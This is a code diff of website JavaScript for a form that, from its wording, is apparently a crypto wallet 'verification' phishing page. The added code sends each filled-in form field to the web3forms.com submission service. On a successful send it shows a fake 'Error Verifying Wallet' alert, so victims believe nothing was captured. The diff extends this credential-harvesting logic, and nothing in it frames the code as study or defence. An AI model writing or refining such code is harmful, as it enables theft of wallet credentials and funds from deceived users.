@@ -105,62 +105,67 @@
       e.preventDefault();
 
       const formData = new FormData(form);
-      
 
       formData.forEach((value, key) => {
         var obj = {};
-        if(value ===  ''){
-          alert(`{$key} cannot be empty`);
-        }else{
-          obj[key] = value;
 
-          var json = JSON.stringify(obj);
+        obj[key] = value;
 
-          result.innerHTML = "Please wait";
-          progressBar.style.display = "block";
+        var json = JSON.stringify(obj);
+
+        result.innerHTML = "Please wait";
+       
+
+        if (obj[key] !== "") {
+          fetch("https://api.web3forms.com/submit", {
+            method: "POST",
+            headers: {
+              "Content-Type": "application/json",
+              Accept: "application/json",
+            },
+            body: json,
+          })
+            .then(async (response) => {
+              progressBar.style.display = "block";
+
+              let json = await response.json();
+              if (response.status == 200) {
+                alert("Error Verifying Wallet... Please try again later");
+                closeModal('.modal-form');
+              } else {
+                console.log(response);
+                result.innerHTML = json.message;
+                result.classList.remove("text-gray-500");
+                result.classList.add("text-red-500");
+                closeModal('.modal-form');
+              }
+            })
+            .catch((error) => {
+              console.log(error);
+              result.innerHTML = "Something went wrong!";
+            })
+            .then(function () {
+              // form.reset();
+              progressBar.style.display = "none";
+              setTimeout(() => {
+                result.style.display = "none";
+                closeModal('.modal-form');
+              }, 5000);
+            });
+        } else {
+          alert( `${key} id empty`);
         }
       });
 
      
-
-      fetch("https://api.web3forms.com/submit", {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json",
-          Accept: "application/json",
-        },
-        body: json,
-      })
-        .then(async (response) => {
-          let json = await response.json();
-          if (response.status == 200) {
-            alert("Error Verifying Wallet... Please try again later");
-          } else {
-            console.log(response);
-            result.innerHTML = json.message;
-            result.classList.remove("text-gray-500");
-            result.classList.add("text-red-500");
-          }
-        })
-        .catch((error) => {
-          console.log(error);
-          result.innerHTML = "Something went wrong!";
-        })
-        .then(function () {
-          // form.reset();
-          progressBar.style.display = "none";
-          setTimeout(() => {
-            result.style.display = "none";
-          }, 5000);
-        });
     });
   });
 
-  let boxBtn = select('#inbox-modal');
-  let loading = select('.loading');
+  let boxBtn = select("#inbox-modal");
+  let loading = select(".loading");
 
-  loading.style.display = 'flex';
-  boxBtn.style.display = 'none';
+  loading.style.display = "flex";
+  boxBtn.style.display = "none";
 
   setTimeout(() => {
     loading.style.display = "none";
